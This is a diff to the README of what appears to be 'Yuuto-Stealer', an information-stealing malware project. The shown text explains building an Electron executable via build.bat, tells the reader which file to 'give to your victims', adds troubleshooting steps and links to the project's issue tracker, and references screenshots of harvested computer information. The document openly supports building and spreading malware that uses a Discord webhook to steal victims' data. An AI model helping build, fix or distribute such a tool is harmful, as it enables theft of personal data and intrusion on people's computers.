@@ -48,6 +48,11 @@ If you didn't create a Discord webhook, create it. Then, run the ``build.bat`` f
 * Finally, it will build Electron executable. If this is the first time you're building, it will download some things, this is normal.
 * When the build is finished, an explorer window will pop, selecting the file you'll need to give to your victims.
 
+**If there is an issue or an error**
+* Open a command prompt and navigate to the directory where you extracted the zip.
+* Run ``build.bat`` and wait until there's, or you think is an error.
+* Finally, [create an issue on the repository](https://github.com/JustYuuto/Yuuto-Stealer/issues/new) with the error.
+
 ## Screenshots
 
 ![Computer info](screenshots/computer.png)
